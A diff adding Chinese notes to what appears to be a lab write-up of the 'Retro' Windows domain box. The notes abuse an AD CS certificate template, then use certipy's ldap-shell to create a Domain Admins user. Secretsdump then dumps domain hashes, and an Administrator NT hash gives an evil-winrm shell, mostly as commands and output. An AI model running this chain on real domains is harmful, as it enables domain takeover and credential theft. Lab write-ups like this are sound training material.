@@ -1,6 +1,28 @@
 ## Retro
 
 ```
+这台 Windows 域靶机的本质是：
+利用证书模板漏洞（AD CS）→ 冒充 Administrator → 但 Kerberos 不支持 → 改用 LDAP → 新建域管用户 → 用新用户 dump 全域 hash
+
+certipy auth -pfx administrator.pfx
+KDC_ERR_PADATA_TYPE_NOSUPP //不支持你用这种证书方式走 Kerberos;
+原因：域控配置不支持 PKINIT（证书 Kerberos 登录）
+
+用 LDAP，当管理员，直接改域
+从域控直接 dump 出整个域的 hash（包括 Administrator、krbtgt）
+1️⃣ 找到 AD CS 漏洞（Certipy find）
+2️⃣ 用机器/低权账号申请“管理员证书”
+3️⃣ certipy auth 试 Kerberos
+   ├─ 成功 → ptt / secretsdump
+   └─ 失败 → 直接 ldap-shell
+4️⃣ ldap-shell：
+   - add_user
+   - change_password
+   - add_user_to_group Domain Admins
+5️⃣ 用新用户 secretsdump
+```
+
+```
 [★]$ nmap -sC -sV 10.129.234.44
 Nmap scan report for 10.129.234.44
 Host is up (0.0090s latency).
@@ -395,3 +417,61 @@ certipy auth -pfx administartor.pfx -dc-ip 10.129.234.44
 ```
 #### 要的这种输出（NT hash），只能在 certipy auth 的“非 ldap-shell 模式”下得到
 #### 这个域控不支持“用证书换 Kerberos TGT”（PKINIT）
+```
+[★]$ certipy auth -pfx administrator.pfx -dc-ip 10.129.234.44 -ldap-shell
+# add_user pwned
+Attempting to create user in: %s CN=Users,DC=retro,DC=vl
+Adding new user with username: pwned and password: Nstg;eu3ck?99E< result: OK
+
+# add_user pwned "CN=Users,DC=retro,DC=vl"
+Attempting to create user in: %s CN=Users,DC=retro,DC=vl
+LDAPEntryAlreadyExistsResult - 68 - entryAlreadyExists - None - 00000524: UpdErr: DSID-031A11FA, problem 6005 (ENTRY_EXISTS), data 0
+ - addResponse - None
+
+# change_password pwned P@ssw0rd123!
+Got User DN: CN=pwned,CN=Users,DC=retro,DC=vl
+Attempting to set new password of: P@ssw0rd123!
+Password changed successfully!
+
+# add_user_to_group pwned "Domain Admins"
+Adding user: pwned to group Domain Admins result: OK
+
+# get_user_groups pwned
+CN=Administrators,CN=Builtin,DC=retro,DC=vl
+CN=Domain Admins,CN=Users,DC=retro,DC=vl
+CN=Denied RODC Password Replication Group,CN=Users,DC=retro,DC=vl
+
+#exit
+```
+
+```
+[★]$ secretsdump.py retro.vl/pwned:'P@ssw0rd123!'@10.129.234.44 -just-dc
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389:::
+<SNIP>
+```
+#### 用新用户 dump 全域 hash
+```
+[★]$ evil-winrm -u Administrator -H 252fac7066d93dd009d4fd2cd0368389 -i retro.vl
+                                        
+Evil-WinRM shell v3.5
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+retro\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\Users\Administrator\Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          4/8/2025   8:11 PM             32 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
+```
